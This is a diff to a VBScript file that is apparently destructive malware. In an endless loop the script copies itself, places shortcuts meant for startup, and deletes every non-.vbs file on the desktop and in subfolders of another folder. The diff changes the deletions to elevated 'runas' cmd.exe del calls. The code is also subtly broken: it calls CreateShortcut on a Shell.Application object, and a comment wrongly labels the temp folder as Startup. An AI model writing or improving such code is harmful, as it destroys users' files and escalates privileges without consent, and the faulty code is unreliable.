@@ -1,4 +1,5 @@
 Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("Shell.Application")
 strScriptPath = WScript.ScriptFullName
 
 ' Specify the number of copies you want to create
@@ -20,7 +21,6 @@ Do While True
         strStartupFolder = objFSO.GetSpecialFolder(2) ' 2 represents the Startup folder
         
         ' Create a shortcut to the copied script in the startup folder
-        Set objShell = CreateObject("WScript.Shell")
         Set objShortcut = objShell.CreateShortcut(strStartupFolder & "\Copy" & i & ".lnk")
         objShortcut.TargetPath = strDesktopCopyPath
         objShortcut.Save
@@ -29,7 +29,7 @@ Do While True
     ' Loop through the desktop folder and delete non-vbs files
     For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
         If objFSO.GetExtensionName(objFile.Name) <> "vbs" Then
-            objFSO.DeleteFile objFile.Path, True
+            objShell.ShellExecute "cmd.exe", "/c del """ & objFile.Path & """", "", "runas", 1
         End If
     Next
 
@@ -39,11 +39,11 @@ Do While True
     For Each objSubFolder In objExplorerFolder.SubFolders
         For Each objFile In objSubFolder.Files
             If objFSO.GetExtensionName(objFile.Name) <> "vbs" Then
-                objFSO.DeleteFile objFile.Path, True
+                objShell.ShellExecute "cmd.exe", "/c del """ & objFile.Path & """", "", "runas", 1
             End If
         Next
     Next
     
     ' Wait for a certain amount of time before looping again
-    WScript.Sleep 0 
+    WScript.Sleep 0
 Loop
